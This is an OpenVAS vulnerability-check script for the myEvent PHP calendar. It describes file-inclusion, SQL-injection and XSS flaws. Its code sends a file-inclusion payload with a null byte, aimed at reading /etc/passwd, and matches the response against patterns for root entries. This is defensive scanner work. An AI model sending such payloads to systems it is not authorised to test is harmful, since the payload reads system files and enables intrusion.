###############################################################################
# OpenVAS Vulnerability Test
# $Id: myevent_multiple_flaws.nasl 4489 2016-11-14 08:23:54Z teissa $
#
# Multiple Remote Vulnerabilities in myEvent
#
# Authors:
# Josh Zlatin-Amishav (josh at ramat dot cc)
#
# Copyright:
# Copyright (C) 2006 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80074");
  script_version("$Revision: 4489 $");
  script_tag(name:"last_modification", value:"$Date: 2016-11-14 09:23:54 +0100 (Mon, 14 Nov 2016) $");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2006-1890", "CVE-2006-1907", "CVE-2006-1908");
  script_bugtraq_id(17575, 17580);
  script_xref(name:"OSVDB", value:"24719");
  script_xref(name:"OSVDB", value:"24720");
  script_xref(name:"OSVDB", value:"24721");
  script_xref(name:"OSVDB", value:"24722");
  script_xref(name:"OSVDB", value:"24723");
  script_xref(name:"OSVDB", value:"24724");
  script_xref(name:"OSVDB", value:"24725");
  script_name("Multiple Remote Vulnerabilities in myEvent");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2006 Josh Zlatin-Amishav");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://seclists.org/lists/bugtraq/2006/Apr/0331.html");

  tag_solution = "Unknown at this time.";

  tag_summary = "The remote web server contains a PHP application that is affected by
  multiple vulnerabilities. 

  Description :

  The remote host is running myEvent, a calendar application written in PHP. 

  The installed version of myEvent fails to sanitize user input to the
  'myevent_path' parameter in several scripts before using it to include
  PHP code from other files. An unauthenticated attacker may be able to
  read arbitrary local files or include a file from a remote host that
  contains commands which will be executed on the remote host subject to
  the privileges of the web server process. 

  In addition, user input to the 'event_id' parameter in 'addevent.php'
  and 'del.php', and to the 'event_desc' parameter in 'addevent.php' is
  not properly sanitised before being used in a SQL query, which may
  allow an attacker to insert arbritrary SQL statements in the remote
  database.  A similar lack of sanitation involving the 'event_desc'
  parameter of 'addevent.php' allows for cross-site scripting attacks
  against the affected application. 

  These flaws are exploitable only if PHP's register_globals is enabled.";

  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"solution", value:tag_solution);

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  # Try to exploit the flaw in viewevent.php to read /etc/passwd.
  url = string( dir, "/myevent.php?myevent_path=/etc/passwd%00" );

  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

  # There's a problem if...
  if (
    # It looks like myEvent and...
    'href="http://www.mywebland.com">myEvent' >< res &&
    ( 
      # there's an entry for root or...
      egrep( pattern:".*root:.*:0:[01]:.*", string:res ) ||
      # we get an error saying "failed to open stream" or "Failed opening".
      #
      # nb: this suggests magic_quotes_gpc was enabled but passing 
      #     remote URLs might still work.
      egrep( string:res, pattern:"Warning.+/etc/passwd.+failed to open stream" ) ||
      egrep( string:res, pattern:"Warning.+ Failed opening '/etc/passwd.+for inclusion" )
    )
  ) {
    if( egrep( pattern:".*root:.*:0:[01]:.*", string:res ) ) {
      content = res;
      if( content ) content = content - strstr( content, "<html>" );
    }

    report = report_vuln_url( port:port, url:url ) + '\n\n';

    if( content ) {
      report += string( "Here are the contents of the file '/etc/passwd' that\n",
                        "OpenVAS was able to read from the remote host :\n",
                        "\n", content );
    }

    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );